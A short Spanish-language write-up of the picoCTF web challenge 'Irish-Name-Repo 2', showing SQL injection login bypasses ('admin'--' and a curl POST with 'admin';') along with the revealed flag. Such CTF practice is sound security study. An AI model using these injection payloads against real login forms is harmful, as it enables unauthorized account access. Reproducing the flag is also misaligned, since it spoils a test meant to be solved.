# Irish-Name-Repo 2
There is a website running at `https://jupiter.challenges.picoctf.org/problem/64649/` ([link](https://jupiter.challenges.picoctf.org/problem/64649/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:64649

- Hints: The password is being filtered.

## Solución

https://jupiter.challenges.picoctf.org/problem/64649/

### Web
- Parece muy similar al anterior, si probamos la misma inyección `' or 1==1;`, manda a error: `# SQLi detected.`
- Pero si probamos este bypass jala : `admin'--`
```
username: admin'--
password: pass
SQL query: SELECT * FROM users WHERE name='admin'--' AND password='pass'

# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_aee925db}
```

### Consola
```bash
curl https://jupiter.challenges.picoctf.org/problem/64649/login.php  -d "username=admin';&password=admin&debug=1"
<pre>username: admin';
password: admin
SQL query: SELECT * FROM users WHERE name='admin';' AND password='admin'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_aee925db}</p>%   

```

## Notas adicionales
. instalar xclip
```bash
 | xclip -sel clip
```

## Referencias

